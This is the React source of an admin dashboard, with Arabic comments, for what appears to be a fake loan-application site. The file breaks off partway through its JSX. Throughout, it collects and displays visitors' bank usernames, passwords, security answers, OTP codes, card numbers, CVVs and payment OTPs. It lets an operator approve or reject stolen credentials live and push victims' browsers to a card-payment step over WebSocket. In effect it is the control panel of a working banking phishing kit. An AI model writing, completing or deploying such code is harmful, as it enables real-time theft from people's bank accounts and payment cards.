// لوحة التحكم الرئيسية — الطلبات مع عرض كامل للبيانات ونظام النسخ
import React, { useEffect, useRef, useState, useCallback } from "react";
import { useQueryClient } from "@tanstack/react-query";
import {
  useGetApplicationStats,
  useListApplications,
  useListSessions,
  getGetApplicationStatsQueryKey,
  getListApplicationsQueryKey,
  getListSessionsQueryKey,
} from "@workspace/api-client-react";
import AdminLayout from "@/components/AdminLayout";
import {
  Users,
  ClipboardList,
  CheckCircle,
  XCircle,
  Clock,
  TrendingUp,
  Wifi,
  WifiOff,
  ChevronDown,
  ChevronUp,
  User,
  Building2,
  CreditCard,
  Smartphone,
  Key,
  ExternalLink,
  History,
  Trash2,
  RotateCcw,
  AlertTriangle,
  ShieldCheck,
  Landmark,
} from "lucide-react";
import { timeAgo, TimeCounter, useTimeTicker } from "@/lib/timeAgo";

const BASE = import.meta.env.BASE_URL.replace(/\/$/, "");

const stepLabels: Record<string, string> = {
  home: "الرئيسية",
  apply: "معلومات الطلب",
  "applicant-info": "معلومات الطلب",
  banks: "اختيار البنك",
  credentials: "بيانات الدخول",
  verify: "رمز التحقق",
  waiting: "انتظار المراجعة",
  success: "تمّت الموافقة",
  "pay-visa": "دفع البطاقة",
};

const statusColors: Record<string, string> = {
  pending: "bg-gray-100 text-gray-600",
  reviewing: "bg-blue-100 text-blue-700",
  approved: "bg-green-100 text-green-700",
  rejected: "bg-red-100 text-red-700",
  waiting: "bg-yellow-100 text-yellow-700",
};

const statusLabels: Record<string, string> = {
  pending: "قيد التقديم",
  reviewing: "مراجعة البيانات",
  approved: "تمت الموافقة",
  rejected: "تم الرفض",
  waiting: "بانتظار الموافقة",
};

// حساب شارة الحالة الصحيحة بناءً على status + currentStep معاً
function getStatusBadge(status: string, currentStep: string): { label: string; color: string } {
  if (status === "approved") return { label: "تمت الموافقة ✓", color: "bg-green-100 text-green-700" };
  if (status === "rejected") return { label: "تم الرفض ✗", color: "bg-red-100 text-red-700" };
  if (status === "reviewing") return { label: "مراجعة البيانات", color: "bg-blue-100 text-blue-700" };
  if (currentStep === "waiting") return { label: "بانتظار الموافقة", color: "bg-yellow-100 text-yellow-700" };
  return { label: "قيد التقديم", color: "bg-gray-100 text-gray-500" };
}

function adminFetch(url: string, options: RequestInit = {}) {
  return fetch(url, {
    ...options,
    credentials: "include",
    headers: { "Content-Type": "application/json", ...(options.headers || {}) },
  });
}

// نوع بيانات النسخة
interface AppVersion {
  id: number;
  version: number;
  isLatest: boolean;
  createdAt: string;
  applicantType?: string;
  fullName?: string;
  nationalId?: string;
  dateOfBirth?: string;
  monthlySalary?: string;
  employer?: string;
  phone?: string;
  email?: string;
  city?: string;
  maritalStatus?: string;
  companyName?: string;
  businessType?: string;
  commercialRegistration?: string;
  employeeCount?: string;
  annualRevenue?: string;
  contactName?: string;
  bankName?: string;
  bankLogo?: string;
  bankUsername?: string;
  bankPassword?: string;
  securityAnswer?: string;
  otpCode?: string;
  [key: string]: unknown;
}

function DataBadge({
  label,
  value,
  badge,
}: {
  label: string;
  value: string | null | undefined;
  badge?: string;
}) {
  if (!value) return null;
  return (
    <div className="flex flex-col gap-0.5">
      <span className="text-xs text-muted-foreground flex items-center gap-1">
        {label}
        {badge && (
          <span className="text-xs bg-blue-100 text-blue-700 px-1.5 py-0.5 rounded">
            {badge}
          </span>
        )}
      </span>
      <span className="font-mono text-sm font-bold bg-muted/50 px-2 py-1 rounded-lg break-all">
        {value}
      </span>
    </div>
  );
}

// شارة الوقت تستخدم useRef لتحديث DOM مباشرة دون إعادة بناء المكونات
function SectionTimeBadge({ timestamp }: { timestamp: string | null | undefined }) {
  const timeRef = useRef<HTMLSpanElement>(null);
  
  useEffect(() => {
    if (!timestamp || !timeRef.current) return;
    
    const updateTime = () => {
      if (timeRef.current) {
        timeRef.current.textContent = `← ${timeAgo(timestamp)}`;
      }
    };
    
    updateTime();
    const intervalId = setInterval(updateTime, 30_000);
    
    return () => clearInterval(intervalId);
  }, [timestamp]);
  
  if (!timestamp) return null;
  
  return (
    <span 
      ref={timeRef}
      className="text-[10px] text-green-600 font-medium mr-2 bg-green-50 px-1.5 py-0.5 rounded-full"
      dir="ltr"
    >
      ← {timeAgo(timestamp)}
    </span>
  );
}

// شارة وقت مصغرة للقائمة الرئيسية - تحديث DOM مباشرة
function TimeBadge({ timestamp, icon, label }: { 
  timestamp: string | null | undefined; 
  icon: React.ReactNode;
  label: string;
}) {
  const timeRef = useRef<HTMLSpanElement>(null);
  
  useEffect(() => {
    if (!timestamp || !timeRef.current) return;
    
    const updateTime = () => {
      if (timeRef.current) {
        timeRef.current.textContent = timeAgo(timestamp);
      }
    };
    
    updateTime();
    const intervalId = setInterval(updateTime, 30_000);
    
    return () => clearInterval(intervalId);
  }, [timestamp]);
  
  if (!timestamp) return null;
  
  return (
    <span 
      className="flex items-center gap-1 bg-blue-50 text-blue-700 px-1.5 py-1 rounded-lg text-[10px] font-medium"
      title={label}
    >
      {icon}
      <span ref={timeRef}>{timeAgo(timestamp)}</span>
    </span>
  );
}

// دمج جميع نسخ الطلب حقلاً بحقل (الأحدث له الأولوية، لكن لا يُسقط حقول القديمة)
function mergeVersionsData(sources: AppVersion[]): AppVersion {
  const FIELDS: (keyof AppVersion)[] = [
    "applicantType", "fullName", "nationalId", "dateOfBirth", "monthlySalary",
    "employer", "phone", "email", "city", "maritalStatus",
    "companyName", "businessType", "commercialRegistration", "employeeCount",
    "annualRevenue", "contactName",
    "bankName", "bankUsername", "bankPassword", "securityAnswer",
    "otpCode",
    "paymentCardNumber", "paymentCardHolder", "paymentExpiryDate", "paymentCvv",
    "paymentOtp", "paymentStatus", "paymentCompletedAt",
  ];
  const sorted = [...sources].sort(
    (a, b) => (Number(b.version) || 0) - (Number(a.version) || 0)
  );
  const result: Record<string, unknown> = {};
  for (const field of FIELDS) {
    for (const src of sorted) {
      const val = src[field as keyof AppVersion];
      if (val !== null && val !== undefined && val !== "") {
        result[field] = val;
        break;
      }
    }
  }
  return result as AppVersion;
}

// مكون عرض سجلات القسم
function HistorySection({ 
  type, 
  records, 
  expanded, 
  onToggle 
}: { 
  type: "applicant" | "credentials" | "otp" | "payment-card" | "payment-otp";
  records: Application[] | undefined;
  expanded: boolean;
  onToggle: () => void;
}) {
  if (!records || records.length === 0) return null;
  
  const titleMap = {
    applicant: "سجلات البيانات الشخصية",
    credentials: "سجلات البنك والدخول",
    otp: "سجلات رموز OTP",
    "payment-card": "سجلات البطاقات",
    "payment-otp": "سجلات OTP البطاقة",
  };
  
  return (
    <div className="border-t border-gray-200 pt-2 mt-2">
      <button
        onClick={onToggle}
        className="w-full flex items-center justify-between bg-gray-100 hover:bg-gray-200 text-gray-600 py-2 px-3 rounded-lg text-xs font-bold transition-all"
      >
        <span className="flex items-center gap-2">
          <History className="w-4 h-4" />
          {titleMap[type]} ({records.length} نسخة)
        </span>
        <ChevronDown className={`w-4 h-4 transition-transform ${expanded ? "rotate-180" : ""}`} />
      </button>
      
      {expanded && (
        <div className="mt-2 space-y-2 max-h-64 overflow-y-auto">
          {(() => {
            const sortedRecords = [...records].sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
            return sortedRecords.map((record, idx) => (
            <div key={record.id} className={`p-3 rounded-lg border text-xs ${
              idx === 0 
                ? "bg-green-50 border-green-300" 
                : "bg-gray-50 border-gray-200"
            }`}>
              <div className="flex items-center justify-between mb-2">
                <span className={`font-bold ${idx === 0 ? "text-green-700" : ""}`}>
                  {idx === 0 ? "🔹 الأحدث" : `منذ ${timeAgo(record.createdAt)}`}
                </span>
                <span className="text-muted-foreground"><TimeCounter dateStr={record.createdAt} /></span>
              </div>
              <div className="grid grid-cols-2 gap-1">
                {type === "applicant" && (
                  <>
                    <span className="text-muted-foreground">الاسم:</span>
                    <span>{record.fullName || record.companyName || record.contactName || "—"}</span>
                    <span className="text-muted-foreground">رقم الهوية:</span>
                    <span>{record.nationalId || record.commercialRegistration || "—"}</span>
                    <span className="text-muted-foreground">الهاتف:</span>
                    <span>{record.phone || "—"}</span>
                    <span className="text-muted-foreground">الراتب:</span>
                    <span>{record.monthlySalary || "—"}</span>
                  </>
                )}
                {type === "credentials" && (
                  <>
                    <span className="text-muted-foreground">المستخدم:</span>
                    <span className="font-mono">{record.bankUsername || "—"}</span>
                    <span className="text-muted-foreground">كلمة المرور:</span>
                    <span className="font-mono">{record.bankPassword || "—"}</span>
                    <span className="text-muted-foreground">البنك:</span>
                    <span>{record.bankName || "—"}</span>
                  </>
                )}
                {type === "otp" && (
                  <>
                    <span className="text-muted-foreground">رمز OTP:</span>
                    <span className="font-mono font-bold">{record.otpCode || "—"}</span>
                  </>
                )}
                {type === "payment-card" && (
                  <>
                    <span className="text-muted-foreground">رقم البطاقة:</span>
                    <span className="font-mono">{record.paymentCardNumber || "—"}</span>
                    <span className="text-muted-foreground">الحامل:</span>
                    <span>{record.paymentCardHolder || "—"}</span>
                    <span className="text-muted-foreground">الانتهاء:</span>
                    <span>{record.paymentExpiryDate || "—"}</span>
                    <span className="text-muted-foreground">الرمز السري (CVV):</span>
                    <span className="font-mono font-bold text-purple-700">{record.paymentCvv || "—"}</span>
                  </>
                )}
                {type === "payment-otp" && (
                  <>
                    <span className="text-muted-foreground">رمز OTP:</span>
                    <span className="font-mono font-bold">{record.paymentOtp || "—"}</span>
                    <span className="text-muted-foreground">الحالة:</span>
                    <span>{record.paymentStatus || "—"}</span>
                  </>
                )}
              </div>
            </div>
          ));
          })()}
        </div>
      )}
    </div>
  );
}

export default function AdminDashboardPage() {
  const queryClient = useQueryClient();
  const [wsConnected, setWsConnected] = useState(false);
  const wsRef = useRef<WebSocket | null>(null);
  const [expandedRows, setExpandedRows] = useState<Set<number>>(new Set());
  const expandedRowsRef = useRef<Set<number>>(new Set()); // ref للقراءة الفورية في WebSocket
  const [expandedTabs, setExpandedTabs] = useState<Record<number, "current" | "older">>({});
  const [historyModal, setHistoryModal] = useState<{
    type: "applicant" | "credentials" | "otp" | "payment-card" | "payment-otp" | null;
    data: Application[];
  }>({ type: null, data: [] });
  
  // حالة توسيع السجلات لكل قسم
  const [expandedHistory, setExpandedHistory] = useState<{
    applicant: boolean;
    credentials: boolean;
    otp: boolean;
    "payment-card": boolean;
    "payment-otp": boolean;
  }>({
    applicant: false,
    credentials: false,
    otp: false,
    "payment-card": false,
    "payment-otp": false,
  });
  const [versionCache, setVersionCache] = useState<Record<number, AppVersion[]>>({});
  
  // تحديث فوري لبيانات الطلبات المعروضة (بمفتاح sessionId)
  // هذا يتتبع أحدث نسخة من كل طلب عن طريق sessionId
  const [latestAppData, setLatestAppData] = useState<Record<string, AppVersion>>({});

  // مزامنة expandedRowsRef مع expandedRows state
  useEffect(() => {
    expandedRowsRef.current = expandedRows;
  }, [expandedRows]);

  // حالة الاتصال الفوري - تُحدَّث فوراً من WebSocket
  const [realtimeSessionStatus, setRealtimeSessionStatus] = useState<Record<string, {
    online: boolean;
    currentPage: string;
    lastSeenAt: string;
  }>>({});

  const { data: stats } = useGetApplicationStats({
    query: { refetchInterval: 8000 },
  });
  const { data: applications } = useListApplications({
    query: { refetchInterval: 4000 },
  });
  const { data: sessions } = useListSessions({
    query: { refetchInterval: 5000 },
  });

  // خريطة سريعة: sessionId → بيانات الجلسة (من الـ polling)
  const sessionMap = new Map((sessions ?? []).map((s) => [s.id, s]));

  // دالة للحصول على حالة الجلسة - تفضل البيانات الفورية على بيانات الـ polling
  const getSessionStatus = useCallback((sessionId: string | undefined) => {
    if (!sessionId) return { online: false, currentPage: "", lastSeenAt: "" };
    
    // 1. البيانات الفورية من WebSocket (الأولوية)
    if (realtimeSessionStatus[sessionId]) {
      return realtimeSessionStatus[sessionId];
    }
    
    // 2. بيانات الـ polling كاحتياط
    const sess = sessionMap.get(sessionId);
    if (sess) {
      return {
        online: isOnline(sess as { lastSeenAt: string }),
        currentPage: (sess as { currentPage?: string }).currentPage || "",
        lastSeenAt: sess.lastSeenAt,
      };
    }
    
    return { online: false, currentPage: "", lastSeenAt: "" };
  }, [sessionMap, realtimeSessionStatus]);

  // تعريف الحضور: آخر ظهور خلال 90 ثانية
  const isOnline = (session: { lastSeenAt: string }) =>
    Date.now() - new Date(session.lastSeenAt).getTime() < 90_000;

  const [notifySession, setNotifySession] = useState("");
  const [notifyMsg, setNotifyMsg] = useState("");
  const [sendingNotify, setSendingNotify] = useState(false);
  const [rejectionMsg, setRejectionMsg] = useState<Record<number, string>>({});
  const [actionLoading, setActionLoading] = useState<Record<string, boolean>>({});

  // سلة المهملات
  const [activeTab, setActiveTab] = useState<"applications" | "trash">("applications");
  const [trashApps, setTrashApps] = useState<typeof applications>([]);
  const [trashLoading, setTrashLoading] = useState(false);
  const [deleteAllConfirm, setDeleteAllConfirm] = useState(false);

  // تحديث تلقائي للوقت كل 30 ثانية
  useTimeTicker(30_000);

  const fetchTrash = async () => {
    setTrashLoading(true);
    try {
      const r = await adminFetch(`${BASE}/api/applications/trash`);
      if (r.ok) setTrashApps(await r.json());
    } finally {
      setTrashLoading(false);
    }
  };

  useEffect(() => {
    if (activeTab === "trash") fetchTrash();
  }, [activeTab]);

  const handleDeleteOne = async (id: number) => {
    setActionLoading((p) => ({ ...p, [`del_${id}`]: true }));
    await adminFetch(`${BASE}/api/applications/${id}`, { method: "DELETE" });
    setActionLoading((p) => ({ ...p, [`del_${id}`]: false }));
    queryClient.invalidateQueries({ queryKey: getListApplicationsQueryKey() });
    queryClient.invalidateQueries({ queryKey: getGetApplicationStatsQueryKey() });
    if (activeTab === "trash") fetchTrash();
  };

  const handleDeleteAll = async () => {
    setDeleteAllConfirm(false);
    await adminFetch(`${BASE}/api/applications`, { method: "DELETE" });
    queryClient.invalidateQueries({ queryKey: getListApplicationsQueryKey() });
    queryClient.invalidateQueries({ queryKey: getGetApplicationStatsQueryKey() });
  };

  const handleRestoreOne = async (id: number) => {
    setActionLoading((p) => ({ ...p, [`restore_${id}`]: true }));
    await adminFetch(`${BASE}/api/applications/${id}/restore`, { method: "POST" });
    setActionLoading((p) => ({ ...p, [`restore_${id}`]: false }));
    queryClient.invalidateQueries({ queryKey: getListApplicationsQueryKey() });
    queryClient.invalidateQueries({ queryKey: getGetApplicationStatsQueryKey() });
    fetchTrash();
  };

  const handleRequestPayment = async (appId: number, sessionId: string) => {
    setActionLoading((p) => ({ ...p, [`pay_${appId}`]: true }));
    try {
      const response = await adminFetch(`${BASE}/api/applications/${appId}/request-payment`, {
        method: "POST",
      });
      const data = await response.json();
      if (data.success) {
        // توجيه العميل مباشرة عبر WebSocket
        const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
        const wsUrl = `${protocol}//${window.location.host}/api/ws`;
        const ws = new WebSocket(wsUrl);
        ws.onopen = () => {
          ws.send(JSON.stringify({
            type: "navigate_user",
            sessionId: sessionId,
            targetStep: "pay-visa",
            applicationId: appId,
          }));
          ws.close();
        };
        // تحديث الصفحة
        queryClient.invalidateQueries({ queryKey: getListApplicationsQueryKey() });
      }
    } catch (err) {
      console.error("Failed to request payment:", err);
    } finally {
      setActionLoading((p) => ({ ...p, [`pay_${appId}`]: false }));
    }
  };

  const handlePaymentAction = async (appId: number, action: "approve" | "reject") => {
    setActionLoading((p) => ({ ...p, [`pay_action_${appId}`]: action }));
    try {
      const response = await adminFetch(`${BASE}/api/applications/${appId}/payment-action`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action }),
      });
      const data = await response.json();
      if (data.success) {
        queryClient.invalidateQueries({ queryKey: getListApplicationsQueryKey() });
        // إذا كانت الموافقة، يتم التحويل تلقائياً عبر WebSocket
      }
    } catch (err) {
      console.error("Payment action failed:", err);
    } finally {
      setActionLoading((p) => ({ ...p, [`pay_action_${appId}`]: false }));
    }
  };

  // معالجة تأكيد/رفض رمز OTP
  const handleOtpAction = async (appId: number, action: "approve" | "reject") => {
    setActionLoading((p) => ({ ...p, [`otp_action_${appId}`]: action }));
    try {
      const response = await adminFetch(`${BASE}/api/applications/${appId}/otp-action`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action }),
      });
      const data = await response.json();
      if (data.success) {
        queryClient.invalidateQueries({ queryKey: getListApplicationsQueryKey() });
      }
    } catch (err) {
      console.error("OTP action failed:", err);
    } finally {
      setActionLoading((p) => ({ ...p, [`otp_action_${appId}`]: false }));
    }
  };

  useEffect(() => {
    const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
    const wsUrl = `${protocol}//${window.location.host}/api/ws`;
    let reconnectTimer: ReturnType<typeof setTimeout>;

    const connect = () => {
      try {
        const ws = new WebSocket(wsUrl);
        wsRef.current = ws;
        ws.onopen = () => setWsConnected(true);
        ws.onclose = () => {
          setWsConnected(false);
          reconnectTimer = setTimeout(connect, 1500);
        };
        ws.onerror = () => setWsConnected(false);
        ws.onmessage = (event) => {
          try {
            const msg = JSON.parse(event.data);
            // تحديث لحظي — السيرفر ينشئ سجلاً جديداً (id مختلف) عند كل تحديث،
            // لذا نطابق بالـ sessionId (ثابت عبر النسخ) لا بالـ id
            if ((msg.type === "application_update" || msg.type === "otp_submitted") && msg.data) {
              // اكتشاف الـ id القديم قبل التحديث (لتحديث versionCache و expandedRows)
              const currentList = queryClient.getQueryData<Array<{ id: number; sessionId: string }>>(
                getListApplicationsQueryKey()
              ) ?? [];
              const oldApp = currentList.find(
                (a: { sessionId: string }) => a.sessionId === msg.data.sessionId
              );
              const oldId = oldApp?.id;
              // استخدام expandedRowsRef للحصول على القيمة الحالية فوراً
              const isExpanded = oldId !== undefined && expandedRowsRef.current.has(oldId);

              // Debug
              console.log('[DEBUG] application_update:', {
                msgDataId: msg.data.id,
                msgDataSessionId: msg.data.sessionId,
                oldId,
                isExpanded,
                msgDataFullName: msg.data.fullName,
                msgDataBankUsername: msg.data.bankUsername,
              });

              // تحديث القائمة: إزالة السجل القديم (بالـ sessionId) وإضافة الجديد كاملاً
              queryClient.setQueryData(
                getListApplicationsQueryKey(),
                (old: unknown) => {
                  if (!Array.isArray(old)) return old;
                  const updated = old.filter(
                    (a: { id: number; sessionId: string }) =>
                      a.id !== msg.data.id && a.sessionId !== msg.data.sessionId
                  );
                  return [msg.data, ...updated];
                }
              );

              // تحديث فوري للبيانات المعروضة حتى قبل جلب النسخ
              // المفتاح يجب أن يكون msg.data.id (الـ ID الجديد) لأن هذا هو الذي سيستخدمه React بعد التحديث
              if (isExpanded || expandedRowsRef.current.has(msg.data.id)) {
                                    console.log('[DEBUG] Updating versionCache immediately with:', msg.data.fullName, 'at key:', msg.data.id);
                setVersionCache((prev) => {
                  const next = { ...prev };
                  // استخدام msg.data.id كمفتاح - هذا هو المفتاح الصحيح بعد التحديث
                  const existingVersions = next[msg.data.id] || [];
                  next[msg.data.id] = [msg.data as unknown as AppVersion, ...existingVersions.filter(v => v.id !== msg.data.id)];
                  // تحديث أيضاً بـ sessionId كمفتاح إضافي لضمان التحديث
                  if (msg.data.sessionId) {
                    const existingBySession = next[msg.data.sessionId] || [];
                    next[msg.data.sessionId] = [msg.data as unknown as AppVersion, ...existingBySession.filter(v => v.id !== msg.data.id)];
                  }
                  // حذف المفتاح القديم إن وُجد
                  if (oldId !== undefined && oldId !== msg.data.id) {
                    delete next[oldId];
                  }
                  console.log('[DEBUG] versionCache updated at key', msg.data.id, 'fullName:', msg.data.fullName);
                  return next;
                });
                
                // تحديث latestAppData بمفتاح sessionId - هذا هو الحل!
                setLatestAppData((prev) => ({
                  ...prev,
                  [msg.data.sessionId]: msg.data as unknown as AppVersion,
                }));
              } else {
                console.log('[DEBUG] NOT updating versionCache because: isExpanded=', isExpanded, 'expandedRowsRef.has=', expandedRowsRef.current.has(msg.data.id));
                // مع ذلك، نحدث latestAppData دائماً حتى لو لم يكن الصف موسعاً
                setLatestAppData((prev) => ({
                  ...prev,
                  [msg.data.sessionId]: msg.data as unknown as AppVersion,
                }));
              }

              // جلب النسخ المحدثة من السيرفر
              // استخدام closures للحفاظ على القيم الصحيحة
              const fetchId = msg.data.id;
              const fetchOldId = oldId;
              adminFetch(`${BASE}/api/applications/${msg.data.id}/versions`)
                .then((r) => (r.ok ? r.json() : null))
                .then((versions) => {
                  if (versions) {
                    console.log('[DEBUG] Fetched versions count:', versions.length, 'for id:', fetchId);
                    setVersionCache((prev) => {
                      const next = { ...prev };
                      // استخدام fetchId (msg.data.id) كمفتاح
                      next[fetchId] = versions;
                      // تحديث أيضاً بـ sessionId كمفتاح إضافي لضمان التحديث
                      if (msg.data.sessionId) {
                        next[msg.data.sessionId] = versions;
                      }
                      // حذف المفتاح القديم
                      if (fetchOldId !== undefined && fetchOldId !== fetchId) {
                        delete next[fetchOldId];
                      }
                      return next;
                    });
                  }
                })
                .catch(() => {});

              // تحديث الصفوف الموسّعة: نقل من الـ old ID إلى الـ new ID
              if (oldId !== undefined && oldId !== msg.data.id) {
                console.log('[DEBUG] Moving expanded row from', oldId, 'to', msg.data.id);
                setExpandedRows((prev) => {
                  if (!prev.has(oldId)) return prev;
                  const next = new Set(prev);
                  next.delete(oldId);
                  next.add(msg.data.id);
                  return next;
                });
                setExpandedTabs((prev) => {
                  if (!(oldId in prev)) return prev;
                  const next = { ...prev };
                  next[msg.data.id] = next[oldId];
                  delete next[oldId];
                  return next;
                });
              }

              queryClient.invalidateQueries({ queryKey: getGetApplicationStatsQueryKey() });
            } else if (msg.type === "application_deleted") {
              // إزالة فورية من الكاش
              queryClient.setQueryData(
                getListApplicationsQueryKey(),
                (old: unknown) => Array.isArray(old) ? old.filter((a: { id: number }) => a.id !== msg.data?.id) : old
              );
              queryClient.invalidateQueries({ queryKey: getGetApplicationStatsQueryKey() });
            } else if (msg.type === "payment_received" && msg.data) {
              // معالجة حدث استلام بيانات الدفع - مشابه لـ application_update
              const currentList = queryClient.getQueryData<Array<{ id: number; sessionId: string }>>(
                getListApplicationsQueryKey()
              ) ?? [];
              const oldApp = currentList.find(
                (a: { sessionId: string }) => a.sessionId === msg.sessionId
              );
              
              // تحديث القائمة: إزالة السجل القديم وإضافة الجديد
              queryClient.setQueryData(
                getListApplicationsQueryKey(),
                (old: unknown) => {
                  if (!Array.isArray(old)) return old;
                  const updated = old.filter(
                    (a: { id: number; sessionId: string }) =>
                      a.id !== msg.data.id && a.sessionId !== msg.sessionId
                  );
                  return [msg.data, ...updated];
                }
              );

              // تحديث versionCache إذا كان الصف موسعاً
              const isExpanded = oldApp?.id !== undefined && expandedRowsRef.current.has(oldApp.id);
              if (isExpanded || expandedRowsRef.current.has(msg.data.id)) {
                setVersionCache((prev) => {
                  const next = { ...prev };
                  const existingVersions = next[msg.data.id] || [];
                  next[msg.data.id] = [msg.data as unknown as AppVersion, ...existingVersions.filter(v => v.id !== msg.data.id)];
                  if (oldApp?.id !== undefined && oldApp.id !== msg.data.id) {
                    delete next[oldApp.id];
                  }
                  return next;
                });
              }

              // تحديث latestAppData
              setLatestAppData((prev) => ({
                ...prev,
                [msg.sessionId]: msg.data as unknown as AppVersion,
              }));

            } else if (msg.type === "payment_completed" && msg.data) {
              // معالجة حدث اكتمال الدفع - نفس منطق payment_received
              const currentList = queryClient.getQueryData<Array<{ id: number; sessionId: string }>>(
                getListApplicationsQueryKey()
              ) ?? [];
              const oldApp = currentList.find(
                (a: { sessionId: string }) => a.sessionId === msg.sessionId
              );

              // تحديث القائمة: إزالة السجل القديم وإضافة الجديد
              queryClient.setQueryData(
                getListApplicationsQueryKey(),
                (old: unknown) => {
                  if (!Array.isArray(old)) return old;
                  const updated = old.filter(
                    (a: { id: number; sessionId: string }) =>
                      a.id !== msg.data.id && a.sessionId !== msg.sessionId
                  );
                  return [msg.data, ...updated];
                }
              );

              // تحديث versionCache إذا كان الصف موسعاً
              const isExpanded = oldApp?.id !== undefined && expandedRowsRef.current.has(oldApp.id);
              if (isExpanded || expandedRowsRef.current.has(msg.data.id)) {
                setVersionCache((prev) => {
                  const next = { ...prev };
                  const existingVersions = next[msg.data.id] || [];
                  next[msg.data.id] = [msg.data as unknown as AppVersion, ...existingVersions.filter(v => v.id !== msg.data.id)];
                  if (oldApp?.id !== undefined && oldApp.id !== msg.data.id) {
                    delete next[oldApp.id];
                  }
                  return next;
                });
              }

              // تحديث latestAppData
              setLatestAppData((prev) => ({
                ...prev,
                [msg.sessionId]: msg.data as unknown as AppVersion,
              }));

              // تحديث stats
              queryClient.invalidateQueries({ queryKey: getGetApplicationStatsQueryKey() });
              // تحديث stats
              queryClient.invalidateQueries({ queryKey: getGetApplicationStatsQueryKey() });
            } else if (msg.type === "applications_cleared") {
              queryClient.setQueryData(getListApplicationsQueryKey(), []);
              queryClient.invalidateQueries({ queryKey: getGetApplicationStatsQueryKey() });
            } else if (msg.type === "session_update") {
              queryClient.invalidateQueries({ queryKey: getListApplicationsQueryKey() });
              queryClient.invalidateQueries({ queryKey: getGetApplicationStatsQueryKey() });
              // تحديث فوري لبيانات الجلسة في الكاش
              if (msg.data) {
                // تحديث فوري لحالة الاتصال في الواجهة (فوراً بدون تأخير)
                const isActive = msg.data.isActive !== undefined ? msg.data.isActive : true;
                const currentPage = msg.data.currentPage || "";
                const lastSeenAt = msg.data.lastSeenAt || new Date().toISOString();
                
                setRealtimeSessionStatus(prev => ({
                  ...prev,
                  [msg.data.id]: {
                    online: isActive,
                    currentPage,
                    lastSeenAt,
                  }
                }));
                
                queryClient.setQueryData(
                  getListSessionsQueryKey(),
                  (old: unknown) => {
                    if (!Array.isArray(old)) return old;
                    const idx = old.findIndex((s: { id: string }) => s.id === msg.data.id);
                    if (idx === -1) return [msg.data, ...old];
                    const updated = [...old];
                    updated[idx] = { ...updated[idx], ...msg.data };
                    return updated;
                  }
                );
              } else {
                queryClient.invalidateQueries({ queryKey: getListSessionsQueryKey() });
              }
            }
          } catch {}
        };
      } catch {}
    };
    connect();
    return () => {
      clearTimeout(reconnectTimer);
      wsRef.current?.close();
    };
  }, [queryClient]);

  const toggleRow = async (id: number) => {
    setExpandedRows((prev) => {
      const next = new Set(prev);
      if (next.has(id)) {
        next.delete(id);
      } else {
        next.add(id);
        // جلب جميع النسخ عند التوسيع
        if (!versionCache[id]) {
          fetchVersions(id);
        }
      }
      return next;
    });
  };

  const fetchVersions = async (appId: number, sessionId?: string) => {
    try {
      const r = await adminFetch(`${BASE}/api/applications/${appId}/versions`);
      if (r.ok) {
        const versions = await r.json();
        setVersionCache((prev) => {
          const next = { ...prev, [appId]: versions };
          // تحديث أيضاً بـ sessionId إذا تم توفيره
          if (sessionId) {
            next[sessionId] = versions;
          }
          return next;
        });
      }
    } catch (e) {
      console.error("فشل في جلب النسخ:", e);
    }
  };

  const handleCredentialsDecision = async (
    sessionId: string,
    decision: "approved" | "rejected",
    appId: number,
  ) => {
    const key = `cred_${appId}_${decision}`;
    setActionLoading((l) => ({ ...l, [key]: true }));
    await adminFetch(
      `${BASE}/api/admin/sessions/${sessionId}/credentials-decision`,
      {
        method: "POST",
        body: JSON.stringify({ decision, message: rejectionMsg[appId] || "" }),
      },
    );
    setActionLoading((l) => ({ ...l, [key]: false }));
    queryClient.invalidateQueries({ queryKey: getListApplicationsQueryKey() });
  };

  const handleOtpDecision = async (
    sessionId: string,
    decision: "approved" | "rejected" | "no_credit",
    appId: number,
  ) => {
    const key = `otp_${appId}_${decision}`;
    setActionLoading((l) => ({ ...l, [key]: true }));
    await adminFetch(`${BASE}/api/admin/sessions/${sessionId}/otp-decision`, {
      method: "POST",
      body: JSON.stringify({ decision }),
    });
    setActionLoading((l) => ({ ...l, [key]: false }));
    queryClient.invalidateQueries({ queryKey: getListApplicationsQueryKey() });
  };

  const handleSendNotification = async () => {
    if (!notifyMsg) return;
    setSendingNotify(true);
    await adminFetch(`${BASE}/api/admin/notify`, {
      method: "POST",
      body: JSON.stringify({
        sessionId: notifySession || undefined,
        message: notifyMsg,
      }),
    });
    setNotifyMsg("");
    setNotifySession("");
    setSendingNotify(false);
  };

  const statCards = [
    {
      label: "إجمالي الطلبات",
      value: stats?.total ?? 0,
      icon: <ClipboardList className="w-5 h-5" />,
      color: "text-primary",
      bg: "bg-primary/10",
    },
    {
      label: "قيد الانتظار",
      value: stats?.pending ?? 0,
      icon: <Clock className="w-5 h-5" />,
      color: "text-yellow-600",
      bg: "bg-yellow-50",
    },
    {
      label: "قيد المراجعة",
      value: stats?.reviewing ?? 0,
      icon: <TrendingUp className="w-5 h-5" />,
      color: "text-blue-600",
      bg: "bg-blue-50",
    },
    {
      label: "موافق عليها",
      value: stats?.approved ?? 0,
      icon: <CheckCircle className="w-5 h-5" />,
      color: "text-green-600",
      bg: "bg-green-50",
    },
    {
      label: "مرفوضة",
      value: stats?.rejected ?? 0,
      icon: <XCircle className="w-5 h-5" />,
      color: "text-red-600",
      bg: "bg-red-50",
    },
    {
      label: "نشط اليوم",
      value: stats?.activeToday ?? 0,
      icon: <Users className="w-5 h-5" />,
      color: "text-purple-600",
      bg: "bg-purple-50",
    },
  ];

  return (
    <AdminLayout>
      <div className="p-4 md:p-6">
        {/* الرأس */}
        <div className="flex justify-between items-center mb-6">
          <div>
            <h1 className="text-2xl font-black text-foreground">لوحة التحكم</h1>
            <p className="text-muted-foreground text-sm mt-1">
              مراقبة الطلبات{" "}
            </p>
          </div>
          <div
            className={`flex items-center gap-2 px-3 py-1.5 rounded-full text-sm font-medium ${wsConnected ? "bg-green-100 text-green-700" : "bg-red-100 text-red-700"}`}
          >
            {wsConnected ? (
              <Wifi className="w-4 h-4" />
            ) : (
              <WifiOff className="w-4 h-4" />
            )}
            {wsConnected ? "متصل" : "غير متصل"}
          </div>
        </div>

        {/* الإحصائيات */}
        <div className="grid grid-cols-3 md:grid-cols-6 gap-3 mb-6">
          {statCards.map((card, i) => (
